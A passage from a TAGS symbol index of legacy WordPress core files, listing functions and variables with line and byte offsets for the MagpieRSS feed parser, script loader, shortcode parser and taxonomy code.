		if ( $el == 'item' or $el == 'entry' )el222,5532
			$this->current_item = array();current_item225,5618
			$this->initem = false;initem226,5652
		elseif ($this->feed_type == RSS and $this->current_namespace == '' and $el == 'textinput' )current_namespace228,5682
			$this->intextinput = false;intextinput230,5780
		elseif ($this->feed_type == RSS and $this->current_namespace == '' and $el == 'image' )current_namespace232,5815
			$this->inimage = false;inimage234,5909
			$this->incontent = false;incontent238,6027
		elseif ($el == 'channel' or $el == 'feed' )el240,6060
			$this->inchannel = false;inchannel242,6110
		$this->current_namespace = false;current_namespace261,6503
	function concat (&$str1, $str2="") {concat264,6543
	function concat (&$str1, $str2="") {str2264,6543
			$str1="";str1266,6605
	function append_content($text) {append_content271,6644
	function append($el, $text) {append281,6923
	function normalize () {normalize325,7887
			for ( $i = 0; $i < count($this->items); $i++) {i329,8034
				$item = $this->items[$i];item330,8085
			for ( $i = 0; $i < count($this->items); $i++) {i341,8426
				$item = $this->items[$i];item342,8477
	function is_rss () {is_rss353,8740
		if ( $this->feed_type == RSS ) {feed_type354,8762
	function is_atom() {is_atom362,8866
		if ( $this->feed_type == ATOM ) {feed_type363,8888
	function map_attrs($k, $v) {map_attrs371,8993
	function error( $errormsg, $lvl = E_USER_WARNING ) {error375,9049
	function error( $errormsg, $lvl = E_USER_WARNING ) {lvl375,9049
function fetch_rss ($url) {fetch_rss400,9621
		$resp = _fetch_remote_file( $url );resp412,9855
		$cache = new RSSCache( MAGPIE_CACHE_DIR, MAGPIE_CACHE_AGE );cache429,10280
		$cache_status 	 = 0;		// response of check_cachecache_status435,10430
		$request_headers = array(); // HTTP headers to send with fetchrequest_headers436,10481
		$rss 			 = 0;		// parsed RSS objectrss437,10546
		$errormsg		 = 0;		// errors, if anyerrormsg438,10584
			$cache_status = $cache->check_cache( $url );cache_status442,10686
		if ( $cache_status == 'HIT' ) {cache_status446,10800
			$rss = $cache->get( $url );rss447,10834
		if ( $cache_status == 'STALE' ) {cache_status460,11092
			$rss = $cache->get( $url );rss461,11128
		$resp = _fetch_remote_file( $url, $request_headers );resp468,11339
				$rss = _response_to_rss( $resp );rss481,11721
				$errormsg = "Failed to fetch $url. ";errormsg492,11945
					$http_error = substr($resp->error, 0, -2);http_error496,12086
			$errormsg = "Unable to retrieve RSS file for unknown reasons.";errormsg505,12289
function _fetch_remote_file($url, $headers = "" ) {_fetch_remote_file538,12942
function _fetch_remote_file($url, $headers = "" ) {headers538,12942
	$resp = wp_remote_request($url, array('headers' => $headers, 'timeout' => MAGPIE_FETCH_TIME_OUT));resp539,12994
		$error = array_shift($resp->errors);error541,13123
		$resp = new stdClass;resp543,13163
	$return_headers = array();return_headers552,13423
	foreach ( wp_remote_retrieve_headers( $resp ) as $key => $value ) {key553,13451
	$response = new stdClass;response562,13671
function _response_to_rss ($resp) {_response_to_rss581,14087
	$rss = new MagpieRSS( $resp->results );rss582,14123
				$field = $h;field594,14503
				$val = "";val595,14520
			if ( $field == 'etag' ) {field598,14541
			if ( $field == 'last-modified' ) {field602,14599
		$errormsg = "Failed to parse RSS file.";errormsg610,14737
function init () {init628,15058
		define('MAGPIE_INITALIZED', 1);MAGPIE_INITALIZED633,15137
		define('MAGPIE_CACHE_ON', 1);MAGPIE_CACHE_ON637,15213
		define('MAGPIE_CACHE_DIR', './cache');MAGPIE_CACHE_DIR641,15288
		define('MAGPIE_CACHE_AGE', 60*60); // one hourMAGPIE_CACHE_AGE645,15372
		define('MAGPIE_CACHE_FRESH_ONLY', 0);MAGPIE_CACHE_FRESH_ONLY649,15471
		define('MAGPIE_DEBUG', 0);MAGPIE_DEBUG653,15551
		$ua = 'WordPress/' . $GLOBALS['wp_version'];ua657,15624
			$ua = $ua . ')';ua660,15699
			$ua = $ua . '; No cache)';ua663,15732
		define('MAGPIE_USER_AGENT', $ua);MAGPIE_USER_AGENT666,15767
		define('MAGPIE_FETCH_TIME_OUT', 2);	// 2 second timeoutMAGPIE_FETCH_TIME_OUT670,15851
		define('MAGPIE_USE_GZIP', true);MAGPIE_USE_GZIP675,16006
function is_info ($sc) {is_info679,16047
function is_success ($sc) {is_success683,16108
function is_redirect ($sc) {is_redirect687,16172
function is_error ($sc) {is_error691,16237
function is_client_error ($sc) {is_client_error695,16299
function is_server_error ($sc) {is_server_error699,16368
class RSSCache {RSSCache703,16437
	var $BASE_CACHE;	// where the cache files are storedBASE_CACHE704,16454
	var $MAX_AGE	= 43200;  		// when are files stale, default twelve hoursMAX_AGE705,16508
	var $MAX_AGE	= 43200;  		// when are files stale, default twelve hoursMAX_AGE705,16508
	var $ERROR 		= '';			// accumulate error messagesERROR706,16580
	var $ERROR 		= '';			// accumulate error messagesERROR706,16580
	function RSSCache ($base='', $age='') {RSSCache708,16632
	function RSSCache ($base='', $age='') {age708,16632
		$this->BASE_CACHE = WP_CONTENT_DIR . '/cache';BASE_CACHE709,16673
			$this->BASE_CACHE = $base;BASE_CACHE711,16739
			$this->MAX_AGE = $age;MAX_AGE714,16789
	function set ($url, $rss) {set725,17113
		$cache_option = 'rss_' . $this->file_name( $url );cache_option726,17142
	function get ($url) {get739,17579
		$this->ERROR = "";ERROR740,17602
		$cache_option = 'rss_' . $this->file_name( $url );cache_option741,17623
		if ( ! $rss = get_transient( $cache_option ) ) {rss743,17677
	function check_cache ( $url ) {check_cache760,18232
		$this->ERROR = "";ERROR761,18265
		$cache_option = 'rss_' . $this->file_name( $url );cache_option762,18286
	function serialize ( $rss ) {serialize776,18671
	function unserialize ( $data ) {unserialize783,18909
	function file_name ($url) {file_name793,19260
	function error ($errormsg, $lvl=E_USER_WARNING) {error801,19509
	function error ($errormsg, $lvl=E_USER_WARNING) {lvl801,19509
		$this->ERROR = $errormsg;ERROR806,19688
			function debug ($debugmsg, $lvl=E_USER_NOTICE) {debug814,19825
			function debug ($debugmsg, $lvl=E_USER_NOTICE) {lvl814,19825
function parse_w3cdtf ( $date_str ) {parse_w3cdtf822,20007
	$pat = "/(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2})(:(\d{2}))?(?:([-+])(\d{2}):?(\d{2})|(Z))?/";pat825,20071
		$epoch = gmmktime( $hours, $minutes, $seconds, $month, $day, $year);epoch832,20397
		$offset = 0;offset834,20469
			if ( ! $tz_hour ) { $tz_hour = 0; }tz_hour843,20665
			if ( ! $tz_min ) { $tz_min = 0; }tz_min844,20704
			$offset_secs = (($tz_hour*60)+$tz_min)*60;offset_secs846,20742
			if ( $tz_mod == '+' ) {tz_mod850,20847
				$offset_secs = $offset_secs * -1;offset_secs851,20874
			$offset = $offset_secs;offset854,20918
		$epoch = $epoch + $offset;epoch856,20949
function wp_rss( $url, $num_items = -1 ) {wp_rss876,21348
function wp_rss( $url, $num_items = -1 ) {num_items876,21348
	if ( $rss = fetch_rss( $url ) ) {rss877,21391
function get_rss ($url, $num_items = 5) { // Like get posts, but for RSSget_rss917,22485
function get_rss ($url, $num_items = 5) { // Like get posts, but for RSSnum_items917,22485
	$rss = fetch_rss($url);rss918,22558

wordpress/wp-includes/script-loader.php,4360
 * define('SCRIPT_DEBUG', true); loads the development (non-minified) versions of all scripts and CSS, and disables compression and concatenation,SCRIPT_DEBUG11,388
 * define('CONCATENATE_SCRIPTS', false); disables compression and concatenation of scripts and CSS,CONCATENATE_SCRIPTS12,535
 * define('COMPRESS_SCRIPTS', false); disables compression of scripts,COMPRESS_SCRIPTS13,635
 * define('COMPRESS_CSS', false); disables compression of CSS,COMPRESS_CSS14,706
 * define('ENFORCE_GZIP', true); forces gzip for compression (default is deflate).ENFORCE_GZIP15,769
function wp_default_scripts( &$scripts ) {wp_default_scripts50,1968
		$guessurl = wp_guess_url();guessurl53,2044
	$suffix = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '.dev' : '';suffix60,2308
	$max_upload_size = ( (int) ( $max_up = @ini_get('upload_max_filesize') ) < (int) ( $max_post = @ini_get('post_max_size') ) ) ? $max_up : $max_post;max_upload_size189,12606
		$max_upload_size = __('not configured');max_upload_size192,12788
	$uploader_l10n = array(uploader_l10n195,12882
function wp_default_styles( &$styles ) {wp_default_styles449,26535
	if ( ! $guessurl = site_url() )guessurl451,26577
		$guessurl = wp_guess_url();guessurl452,26610
	$suffix = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '.dev' : '';suffix460,26952
	$rtl_styles = array( 'wp-admin', 'ie', 'media', 'admin-bar', 'wplink', 'customize-controls' );rtl_styles462,27019
	$no_suffix = array( 'farbtastic' );no_suffix464,27178
function wp_prototype_before_jquery( $js_array ) {wp_prototype_before_jquery505,29139
	if ( false === $jquery = array_search( 'jquery', $js_array, true ) )jquery506,29190
	if ( false === $prototype = array_search( 'prototype', $js_array, true ) )prototype509,29281
function wp_just_in_time_script_localization() {wp_just_in_time_script_localization529,29706
function wp_style_loader_src( $src, $handle ) {wp_style_loader_src559,30784
		$color = get_user_option('admin_color');color565,31008
			$color = 'fresh';color568,31116
		$color = $_wp_admin_css_colors[$color];color570,31138
		$parsed = parse_url( $src );parsed571,31180
		$url = $color->url;url572,31211
			$url = preg_replace('/.css$|.css(?=\?)/', '.dev.css', $url);url575,31283
			$url = add_query_arg( $qv, $url );url579,31445
function print_head_scripts() {print_head_scripts597,31771
		$wp_scripts = new WP_Scripts();wp_scripts604,31963
function print_footer_scripts() {print_footer_scripts622,32339
function _print_scripts() {_print_scripts642,32776
	$zip = $compress_scripts ? 1 : 0;zip645,32845
		$zip = 'gzip';zip647,32936
		$src = $wp_scripts->base_url . "/wp-admin/load-scripts.php?c={$zip}&load=" . trim($wp_scripts->concat, ', ') . '&ver=' . $wp_scripts->default_version;src659,33220
function wp_print_head_scripts() {wp_print_head_scripts675,33759
function _wp_footer_scripts() {_wp_footer_scripts692,34096
function wp_print_footer_scripts() {wp_print_footer_scripts702,34259
function wp_enqueue_scripts() {wp_enqueue_scripts714,34582
function print_admin_styles() {print_admin_styles723,34736
		$wp_styles = new WP_Styles();wp_styles727,34865
	$zip = $compress_css ? 1 : 0;zip731,34972
		$zip = 'gzip';zip733,35059
function print_late_styles() {print_late_styles749,35322
function _print_styles() {_print_styles768,35671
	$zip = $compress_css ? 1 : 0;zip771,35734
		$zip = 'gzip';zip773,35821
		$dir = $wp_styles->text_direction;dir776,35876
		$ver = $wp_styles->default_version;ver777,35913
		$href = $wp_styles->base_url . "/wp-admin/load-styles.php?c={$zip}&dir={$dir}&load=" . trim($wp_styles->concat, ', ') . '&ver=' . $ver;href778,35951
function script_concat_settings() {script_concat_settings797,36508
	$compressed_output = ( ini_get('zlib.output_compression') || 'ob_gzhandler' == ini_get('output_handler') );compressed_output800,36609
		$concatenate_scripts = defined('CONCATENATE_SCRIPTS') ? CONCATENATE_SCRIPTS : true;concatenate_scripts803,36759
			$concatenate_scripts = false;concatenate_scripts805,36914
		$compress_scripts = defined('COMPRESS_SCRIPTS') ? COMPRESS_SCRIPTS : true;compress_scripts809,36988
			$compress_scripts = false;compress_scripts811,37163
		$compress_css = defined('COMPRESS_CSS') ? COMPRESS_CSS : true;compress_css815,37230
			$compress_css = false;compress_css817,37389

wordpress/wp-includes/shortcodes.php,1927
 * shortcode parser in your function to account for that.to15,492
 * $out = do_shortcode($content);out25,804
$shortcode_tags = array();shortcode_tags43,1150
 * function footag_func($atts) {footag_func56,1542
 * function bartag_func($atts) {bartag_func66,1749
 * function baztag_func($atts, $content='') {baztag_func81,2055
 * function baztag_func($atts, $content='') {content81,2055
function add_shortcode($tag, $func) {add_shortcode93,2372
function remove_shortcode($tag) {remove_shortcode108,2639
 * This function is simple, it clears all of the shortcode tags by replacing theis117,2765
function remove_all_shortcodes() {remove_all_shortcodes124,3004
	$shortcode_tags = array();shortcode_tags127,3065
function do_shortcode($content) {do_shortcode144,3641
	$pattern = get_shortcode_regex();pattern150,3780
function get_shortcode_regex() {get_shortcode_regex174,4543
	$tagnames = array_keys($shortcode_tags);tagnames176,4601
	$tagregexp = join( '|', array_map('preg_quote', $tagnames) );tagregexp177,4643
function do_shortcode_tag( $m ) {do_shortcode_tag222,6631
	$tag = $m[2];tag230,6809
	$attr = shortcode_parse_atts( $m[3] );attr231,6824
function shortcode_parse_atts($text) {shortcode_parse_atts254,7517
	$atts = array();atts255,7556
	$pattern = '/(\w+)\s*=\s*"([^"]*)"(?:\s|$)|(\w+)\s*=\s*\'([^\']*)\'(?:\s|$)|(\w+)\s*=\s*([^\s\'"]+)(?:\s|$)|"([^"]*)"(?:\s|$)|(\S+)(?:\s|$)/';pattern256,7574
	$text = preg_replace("/[\x{00a0}\x{200b}]+/u", " ", $text);text257,7718
		$atts = ltrim($text);atts272,8259
function shortcode_atts($pairs, $atts) {shortcode_atts293,8939
	$atts = (array)$atts;atts294,8980
	$out = array();out295,9003
	foreach($pairs as $name => $default) {name296,9020
function strip_shortcodes( $content ) {strip_shortcodes314,9401
	$pattern = get_shortcode_regex();pattern320,9546
function strip_shortcode_tag( $m ) {strip_shortcode_tag325,9666

wordpress/wp-includes/taxonomy.php,39315
 * This function fires twice: in wp-settings.php before plugins are loaded (forfires17,170
function create_initial_taxonomies() {create_initial_taxonomies21,392
		$rewrite = array( 'category' => false, 'post_tag' => false, 'post_format' => false );rewrite25,486
		$post_format_base = apply_filters( 'post_format_rewrite_base', 'type' );post_format_base27,584
		$rewrite = array(rewrite28,659
function get_taxonomies( $args = array(), $output = 'names', $operator = 'and' ) {get_taxonomies130,3866
function get_taxonomies( $args = array(), $output = 'names', $operator = 'and' ) {args130,3866
	$field = ('names' == $output) ? 'name' : false;field133,3974
 * It appears that this function can be used to find all of the names inside ofcan141,4169
 * <code><?php $taxonomies = get_object_taxonomies('post'); ?></code> Shouldtaxonomies144,4287
function get_object_taxonomies($object, $output = 'names') {get_object_taxonomies157,4801
function get_object_taxonomies($object, $output = 'names') {output157,4801
		$object = $object->post_type;object163,5006
	$object = (array) $object;object166,5042
	$taxonomies = array();taxonomies168,5071
	foreach ( (array) $wp_taxonomies as $tax_name => $tax_obj ) {tax_name169,5095
 * The get_taxonomy function will first check that the parameter string givenwill184,5420
function get_taxonomy( $taxonomy ) {get_taxonomy197,5852
function taxonomy_exists( $taxonomy ) {taxonomy_exists220,6299
function is_taxonomy_hierarchical($taxonomy) {is_taxonomy_hierarchical244,6980
	$taxonomy = get_taxonomy($taxonomy);taxonomy248,7081
 * A simple function for creating or modifying a taxonomy object based on thefor255,7225
 * parameters given. The function will accept an array (third optionalwill256,7303
function register_taxonomy( $taxonomy, $object_type, $args = array() ) {register_taxonomy305,9534
function register_taxonomy( $taxonomy, $object_type, $args = array() ) {args305,9534
		$wp_taxonomies = array();wp_taxonomies309,9672
	$defaults = array(	'hierarchical' => false,defaults311,9701
	$args = wp_parse_args($args, $defaults);args323,10050
			$tag = '(.+?)';tag341,10698
			$tag = '([^/]+)';tag343,10724
	$default_caps = array(default_caps359,11295
function get_taxonomy_labels( $tax ) {get_taxonomy_labels409,13826
	$nohier_vs_hier_defaults = array(nohier_vs_hier_defaults413,14010
function register_taxonomy_for_object_type( $taxonomy, $object_type) {register_taxonomy_for_object_type447,15679
 * The strings of $taxonomies must exist before this function will continue. Onwill469,16125
 * still test for the WP_Error class and get the error message.and472,16362
function get_objects_in_term( $term_ids, $taxonomies, $args = array() ) {get_objects_in_term494,17409
function get_objects_in_term( $term_ids, $taxonomies, $args = array() ) {args494,17409
		$term_ids = array( $term_ids );term_ids498,17531
		$taxonomies = array( $taxonomies );taxonomies501,17600
	$defaults = array( 'order' => 'ASC' );defaults508,17803
	$args = wp_parse_args( $args, $defaults );args509,17843
	$order = ( 'desc' == strtolower( $order ) ) ? 'DESC' : 'ASC';order512,17918
	$term_ids = array_map('intval', $term_ids );term_ids514,17982
	$taxonomies = "'" . implode( "', '", $taxonomies ) . "'";taxonomies516,18029
	$term_ids = "'" . implode( "', '", $term_ids ) . "'";term_ids517,18088
	$object_ids = $wpdb->get_col("SELECT tr.object_id FROM $wpdb->term_relationships AS tr INNER JOIN $wpdb->term_taxonomy AS tt ON tr.term_taxonomy_id = tt.term_taxonomy_id WHERE tt.taxonomy IN ($taxonomies) AND tt.term_id IN ($term_ids) ORDER BY tr.object_id $order");object_ids519,18144
function get_tax_sql( $tax_query, $primary_table, $primary_id_column ) {get_tax_sql539,18737
	$tax_query_obj = new WP_Tax_Query( $tax_query );tax_query_obj540,18810
 * Container class for a multiple taxonomy query.for545,18938
class WP_Tax_Query {WP_Tax_Query549,19011
	public $queries = array();queries568,19604
	public $queries = array();queries568,19604
	public $relation;relation577,19766
	private static $no_results = array( 'join' => '', 'where' => ' AND 0 = 1' );no_results586,19918
	private static $no_results = array( 'join' => '', 'where' => ' AND 0 = 1' );no_results586,19918
	public function __construct( $tax_query ) {__construct611,20479
			$this->relation = 'OR';relation613,20615
			$this->relation = 'AND';relation615,20653
		$defaults = array(defaults618,20686
			$query = array_merge( $defaults, $query );query630,20919
	public function get_sql( $primary_table, $primary_id_column ) {get_sql648,21251
		$join = '';join651,21333
		$where = array();where652,21347
		$i = 0;i653,21367
				$terms = implode( ',', $terms );terms673,21707
				$alias = $i ? 'tt' . $i : $wpdb->term_relationships;alias675,21745
				$terms = implode( ',', $terms );terms687,22115
				$num_terms = count( $terms );num_terms699,22399
				$terms = implode( ',', $terms );terms701,22434
			$where = ' AND ( ' . implode( " $this->relation ", $where ) . ' )';where715,22709
			$where = '';where717,22787
	private function clean_query( &$query ) {clean_query730,22972
			$query = new WP_Error( 'Invalid taxonomy' );query732,23066
			$children = array();children744,23374
				$children = array_merge( $children, get_term_children( $term, $query['taxonomy'] ) );children746,23440
	private function transform_query( &$query, $resulting_field ) {transform_query764,23867
		$resulting_field = esc_sql( $resulting_field );resulting_field773,24052
				$terms = "'" . implode( "','", array_map( 'sanitize_title_for_query', $query['terms'] ) ) . "'";terms778,24166
				$terms = $wpdb->get_col( "terms779,24267
				$terms = implode( ',', array_map( 'intval', $query['terms'] ) );terms789,24554
				$terms = $wpdb->get_col( "terms790,24623
			$query = new WP_Error( 'Inexistent terms' );query799,24887
 * The usage of the get_term function is to apply filters to a term object. Itis811,25077
function &get_term($term, $taxonomy, $output = OBJECT, $filter = 'raw') {get_term848,26954
function &get_term($term, $taxonomy, $output = OBJECT, $filter = 'raw') {output848,26954
	$null = null;null850,27043
		$error = new WP_Error('invalid_term', __('Empty Term'));error853,27082
		$error = new WP_Error('invalid_taxonomy', __('Invalid taxonomy'));error858,27201
		$_term = $term;_term864,27392
			$term = $term->term_id;term867,27446
		if ( ! $_term = wp_cache_get($term, $taxonomy) ) {_term870,27520
			$_term = $wpdb->get_row( $wpdb->prepare( "SELECT t.*, tt.* FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy AS tt ON t.term_id = tt.term_id WHERE tt.taxonomy = %s AND t.term_id = %d LIMIT 1", $taxonomy, $term) );_term871,27573
	$_term = apply_filters('get_term', $_term, $taxonomy);_term878,27883
	$_term = apply_filters("get_$taxonomy", $_term, $taxonomy);_term879,27939
	$_term = sanitize_term($_term, $taxonomy, $filter);_term880,28000
	if ( $output == OBJECT ) {output882,28054
	} elseif ( $output == ARRAY_A ) {output884,28099
		$__term = get_object_vars($_term);__term885,28134
	} elseif ( $output == ARRAY_N ) {output887,28189
		$__term = array_values(get_object_vars($_term));__term888,28224
function get_term_by($field, $value, $taxonomy, $output = OBJECT, $filter = 'raw') {get_term_by922,29472
function get_term_by($field, $value, $taxonomy, $output = OBJECT, $filter = 'raw') {output922,29472
		$field = 't.slug';field929,29654
		$value = sanitize_title($value);value930,29675
		$value = stripslashes($value);value935,29812
		$field = 't.name';field936,29845
		$term = get_term( (int) $value, $taxonomy, $output, $filter);term938,29876
			$term = false;term940,29970
	$term = $wpdb->get_row( $wpdb->prepare( "SELECT t.*, tt.* FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy AS tt ON t.term_id = tt.term_id WHERE tt.taxonomy = %s AND $field = %s LIMIT 1", $taxonomy, $value) );term944,30008
	$term = apply_filters('get_term', $term, $taxonomy);term950,30307
	$term = apply_filters("get_$taxonomy", $term, $taxonomy);term951,30361
	$term = sanitize_term($term, $taxonomy, $filter);term952,30420
	if ( $output == OBJECT ) {output954,30472
	} elseif ( $output == ARRAY_A ) {output956,30516
	} elseif ( $output == ARRAY_N ) {output958,30584
 * This recursive function will merge all of the children of $term into the samewill968,30766
function get_term_children( $term_id, $taxonomy ) {get_term_children985,31393
	$term_id = intval( $term_id );term_id989,31550
	$terms = _get_term_hierarchy($taxonomy);terms991,31583
	$children = $terms[$term_id];children996,31679
			$children = array_merge($children, get_term_children($child, $taxonomy));children1000,31792
 * Does checks for $term, based on the $taxonomy. The function is for contextualis1009,31931
function get_term_field( $field, $term, $taxonomy, $context = 'display' ) {get_term_field1025,32595
function get_term_field( $field, $term, $taxonomy, $context = 'display' ) {context1025,32595
	$term = (int) $term;term1026,32671
	$term = get_term( $term, $taxonomy );term1027,32693
function get_term_to_edit( $id, $taxonomy ) {get_term_to_edit1056,33423
	$term = get_term( $id, $taxonomy );term1057,33469
function &get_terms($taxonomies, $args = '') {get_terms1165,38315
function &get_terms($taxonomies, $args = '') {args1165,38315
	$empty_array = array();empty_array1167,38377
	$single_taxonomy = false;single_taxonomy1169,38403
		$single_taxonomy = true;single_taxonomy1171,38463
		$taxonomies = array($taxonomies);taxonomies1172,38490
			$error = new WP_Error('invalid_taxonomy', __('Invalid taxonomy'));error1177,38610
	$defaults = array('orderby' => 'name', 'order' => 'ASC',defaults1182,38706
	$args = wp_parse_args( $args, $defaults );args1187,39087
	$args = apply_filters( 'get_terms_args', $args, $taxonomies );args1204,39569
		$hierarchy = _get_term_hierarchy($taxonomies[0]);hierarchy1209,39683
		$hierarchy = _get_term_hierarchy($taxonomies[0]);hierarchy1215,39820
	$filter_key = ( has_filter('list_terms_exclusions') ) ? serialize($GLOBALS['wp_filter']['list_terms_exclusions']) : '';filter_key1221,40021
	$key = md5( serialize( compact(array_keys($defaults)) ) . serialize( $taxonomies ) . $filter_key );key1222,40142
	$last_changed = wp_cache_get('last_changed', 'terms');last_changed1223,40243
		$last_changed = time();last_changed1225,40324
	$cache_key = "get_terms:$key:$last_changed";cache_key1228,40409
	$cache = wp_cache_get( $cache_key, 'terms' );cache1229,40455
		$cache = apply_filters('get_terms', $cache, $taxonomies, $args);cache1231,40529
	$_orderby = strtolower($orderby);_orderby1235,40617
		$orderby = 'tt.count';orderby1237,40681
		$orderby = 't.name';orderby1239,40739
		$orderby = 't.slug';orderby1241,40795
		$orderby = 't.term_group';orderby1243,40857
		$orderby = '';orderby1245,40919
		$orderby = 't.term_id';orderby1247,40986
		$orderby = 't.name';orderby1249,41018
	$orderby = apply_filters( 'get_terms_orderby', $orderby, $args );orderby1251,41042
		$orderby = "ORDER BY $orderby";orderby1254,41135
		$order = '';order1256,41175
	$order = strtoupper( $order );order1258,41191
		$order = 'ASC';order1260,41292
	$where = "tt.taxonomy IN ('" . implode("', '", $taxonomies) . "')";where1262,41311
	$inclusions = '';inclusions1263,41380
		$exclude = '';exclude1265,41426
		$exclude_tree = '';exclude_tree1266,41443
		$interms = wp_parse_id_list($include);interms1267,41465
				$inclusions = ' AND ( t.term_id = ' . intval($interm) . ' ';inclusions1270,41571
	$exclusions = '';exclusions1280,41790
		$excluded_trunks = wp_parse_id_list($exclude_tree);excluded_trunks1282,41843
			$excluded_children = (array) get_terms($taxonomies[0], array('child_of' => intval($extrunk), 'fields' => 'ids', 'hide_empty' => 0));excluded_children1284,41942
					$exclusions = ' AND ( t.term_id <> ' . intval($exterm) . ' ';exclusions1288,42190
		$exterms = wp_parse_id_list($exclude);exterms1296,42372
				$exclusions = ' AND ( t.term_id <> ' . intval($exterm) . ' ';exclusions1299,42478
	$exclusions = apply_filters('list_terms_exclusions', $exclusions, $args );exclusions1307,42675
		$slug = sanitize_title($slug);slug1311,42800
		$name__like = like_escape( $name__like );name__like1316,42904
		$parent = (int) $parent;parent1321,43049
			$limits = 'LIMIT ' . $offset . ',' . $number;limits1331,43371
			$limits = 'LIMIT ' . $number;limits1333,43427
		$limits = '';limits1335,43470
		$search = like_escape($search);search1339,43516
	$selects = array();selects1343,43629
			$selects = array('t.*', 'tt.*');selects1346,43686
			$selects = array('t.term_id', 'tt.parent', 'tt.count');selects1350,43767
			$selects = array('t.term_id', 'tt.parent', 'tt.count', 't.name');selects1353,43852
			$orderby = '';orderby1356,43947
			$order = '';order1357,43965
			$selects = array('COUNT(*)');selects1358,43981
	$_fields = $fields;_fields1361,44018
	$fields = implode(', ', apply_filters( 'get_terms_fields', $selects, $args ));fields1363,44040
	$join = "INNER JOIN $wpdb->term_taxonomy AS tt ON t.term_id = tt.term_id";join1365,44121
	$pieces = array( 'fields', 'join', 'where', 'orderby', 'order', 'limits' );pieces1367,44198
	$clauses = apply_filters( 'terms_clauses', compact( $pieces ), $taxonomies, $args );clauses1368,44275
	$query = "SELECT $fields FROM $wpdb->terms AS t $join WHERE $where $orderby $order $limits";query1372,44460
	$fields = $_fields;fields1374,44555
		$term_count = $wpdb->get_var($query);term_count1377,44606
	$terms = $wpdb->get_results($query);terms1381,44672
		$terms = apply_filters('get_terms', array(), $taxonomies, $args);terms1388,44860
		$children = _get_term_hierarchy($taxonomies[0]);children1393,44969
			$terms = & _get_term_children($child_of, $terms, $taxonomies[0]);terms1395,45048
		foreach ( $terms as $k => $term ) {k1404,45368
				$children = _get_term_children($term->term_id, $terms, $taxonomies[0]);children1406,45433
	$_terms = array();_terms1419,45705
		while ( $term = array_shift($terms) )term1421,45759
		$terms = $_terms;terms1423,45843
		while ( $term = array_shift($terms) )term1425,45896
		$terms = $_terms;terms1427,45967
		while ( $term = array_shift($terms) )term1429,46022
		$terms = $_terms;terms1431,46090
		$terms = array_slice($terms, $offset, $number);terms1435,46172
	$terms = apply_filters('get_terms', $terms, $taxonomies, $args);terms1440,46291
function term_exists($term, $taxonomy = '', $parent = 0) {term_exists1461,46924
function term_exists($term, $taxonomy = '', $parent = 0) {taxonomy1461,46924
	$select = "SELECT term_id FROM $wpdb->terms as t WHERE ";select1464,46999
	$tax_select = "SELECT tt.term_id, tt.term_taxonomy_id FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy as tt ON tt.term_id = t.term_id WHERE ";tax_select1465,47058
		$where = 't.term_id = %d';where1470,47267
	$term = trim( stripslashes( $term ) );term1477,47526
	if ( '' === $slug = sanitize_title($term) )slug1479,47567
	$where = 't.slug = %s';where1482,47625
	$else_where = 't.name = %s';else_where1483,47650
	$where_fields = array($slug);where_fields1484,47680
	$else_where_fields = array($term);else_where_fields1485,47711
		$parent = (int) $parent;parent1487,47775
		if ( $result = $wpdb->get_row( $wpdb->prepare("SELECT tt.term_id, tt.term_taxonomy_id FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy as tt ON tt.term_id = t.term_id WHERE $where AND tt.taxonomy = %s", $where_fields), ARRAY_A) )result1498,48040
	if ( $result = $wpdb->get_var( $wpdb->prepare("SELECT term_id FROM $wpdb->terms as t WHERE $where", $where_fields) ) )result1504,48541
function term_is_ancestor_of( $term1, $term2, $taxonomy ) {term_is_ancestor_of1522,49203
		$term1 = get_term( $term1, $taxonomy );term11524,49298
		$term2 = get_term( $term2, $taxonomy );term21526,49374
 * this function will sanitize <strong>all</strong> fields. The context is basedwill1540,49759
function sanitize_term($term, $taxonomy, $context = 'display') {sanitize_term1556,50277
function sanitize_term($term, $taxonomy, $context = 'display') {context1556,50277
	$fields = array('term_id', 'name', 'description', 'slug', 'count', 'parent', 'term_group');fields1561,50386
	$do_object = false;do_object1563,50480
		$do_object = true;do_object1565,50526
	$term_id = $do_object ? $term->term_id : (isset($term['term_id']) ? $term['term_id'] : 0);term_id1567,50548
 * Passing a term field value through the function should be assumed to haveshould1590,51145
 * without creating your own filter function. Simply create a function thatthat1597,51476
function sanitize_term_field($field, $value, $term_id, $taxonomy, $context) {sanitize_term_field1613,51950
		$value = (int) $value;value1615,52128
			$value = 0;value1617,52173
		$value = apply_filters("edit_term_{$field}", $value, $term_id, $taxonomy);value1624,52265
		$value = apply_filters("edit_{$taxonomy}_{$field}", $value, $term_id);value1625,52342
			$value = esc_html($value); // textarea_escapedvalue1627,52448
			$value = esc_attr($value);value1629,52505
		$value = apply_filters("pre_term_{$field}", $value, $taxonomy);value1631,52569
		$value = apply_filters("pre_{$taxonomy}_{$field}", $value);value1632,52635
			$value = apply_filters('pre_category_nicename', $value);value1635,52748
		$value = apply_filters("term_{$field}_rss", $value, $taxonomy);value1638,52844
		$value = apply_filters("{$taxonomy}_{$field}_rss", $value);value1639,52910
		$value = apply_filters("term_{$field}", $value, $term_id, $taxonomy, $context);value1642,53019
		$value = apply_filters("{$taxonomy}_{$field}", $value, $term_id, $context);value1643,53101
		$value = esc_attr($value);value1647,53215
		$value = esc_js($value);value1649,53274
function wp_count_terms( $taxonomy, $args = array() ) {wp_count_terms1670,53800
function wp_count_terms( $taxonomy, $args = array() ) {args1670,53800
	$defaults = array('hide_empty' => false);defaults1671,53856
	$args = wp_parse_args($args, $defaults);args1672,53899
function wp_delete_object_term_relationships( $object_id, $taxonomies ) {wp_delete_object_term_relationships1700,54622
	$object_id = (int) $object_id;object_id1703,54712
		$taxonomies = array($taxonomies);taxonomies1706,54776
		$tt_ids = wp_get_object_terms($object_id, $taxonomy, array('fields' => 'tt_ids'));tt_ids1709,54861
		$in_tt_ids = "'" . implode("', '", $tt_ids) . "'";in_tt_ids1710,54946
function wp_delete_term( $term, $taxonomy, $args = array() ) {wp_delete_term1743,56274
function wp_delete_term( $term, $taxonomy, $args = array() ) {args1743,56274
	$term = (int) $term;term1746,56353
	if ( ! $ids = term_exists($term, $taxonomy) )ids1748,56376
